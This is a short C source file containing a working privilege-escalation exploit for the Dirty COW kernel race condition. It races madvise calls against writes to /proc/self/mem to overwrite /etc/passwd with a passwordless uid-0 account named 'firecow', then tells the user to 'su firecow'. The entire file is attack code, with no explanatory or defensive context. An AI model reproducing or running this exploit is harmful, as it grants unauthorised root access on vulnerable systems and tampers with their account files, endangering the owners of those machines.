// dirtycow_quick.c
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h> 
 
char *target = "/etc/passwd";
char backup[] = "firecow::0:0:root:/root:/bin/bash\n";
 
void *madviseThread(void *arg) {
  for (int i = 0; i < 1000000; i++) {
    madvise((void *)arg, 100, MADV_DONTNEED);
  }
}
 
void *writeThread(void *arg) {
  int fd = open("/proc/self/mem", O_RDWR);
  for (int i = 0; i < 1000000; i++) {
    lseek(fd, (off_t)arg, SEEK_SET);
    write(fd, backup, sizeof(backup));
  }
}
 
int main() {
  int f = open(target, O_RDONLY);
  char *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, f, 0);
  pthread_t p1, p2;
  pthread_create(&p1, NULL, madviseThread, map);
  pthread_create(&p2, NULL, writeThread, map);
  pthread_join(p1, NULL);
  pthread_join(p2, NULL);
  printf("Try: su firecow\n");
  return 0;
}
